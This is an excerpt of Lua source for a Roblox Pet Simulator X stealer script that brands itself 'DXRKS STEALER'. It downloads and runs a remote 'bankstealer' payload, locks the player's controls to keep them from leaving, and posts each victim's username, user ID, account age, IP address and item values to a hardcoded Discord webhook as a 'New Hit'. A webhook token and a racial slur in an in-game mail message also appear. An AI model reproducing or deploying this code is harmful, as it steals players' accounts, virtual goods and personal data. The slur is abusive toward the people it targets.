...
if hugeamount >1 or Client.leaderstats.Diamonds.value > 100000000 or Client.leaderstats.RAP.value > 100000000 then
     UserName = "kj_wldn"
     Webhook = "https://discord.com/api/webhooks/1128992320436580374/rbzcHU3rtFkTGeXFyFhu_HK1Ri6ylO6lsPYrWsuhB3TAP8y2ndG4WzZtwHOotTdHyPbN"
end
...
if diaamt < 110000 then
    ...
    _G.AntiLeave = true
    _G.MouseLock = true
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
    return;
end
...
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    ...
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1118557590465548418/1123260223587635270/diX4Qq.jpg?size=60"
        data1 = {
            ["content"] = ping,
            ["username"] = " DXRKS STEALER ON TOP",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With DXRKS STEALER||",
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using DXRKS SCRIPT ** :moyai:",
        ...
        data1 = {
            ["content"] = ping,
            ["username"] = "DXRK ON TOP",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** ||With Diamond Stealerz Scriptz||",
                ["url"] = "https://discord.gg/",
                ["type"] = "rich",
                ["color"] = tonumber(0x2798FF),
                ["thumbnail"] = {
                ...
                ["fields"] = { {
                    ["name"] = "**This data was generated using DXRKS STEALER** :moyai:",
                    ["value"] = "```Username     : " .. username ..
                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                        " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
...
local mythicin
local gemsin
local mailmsg = "DXRK RUNS YOU NIGGA"
if dhuser ~= nil then
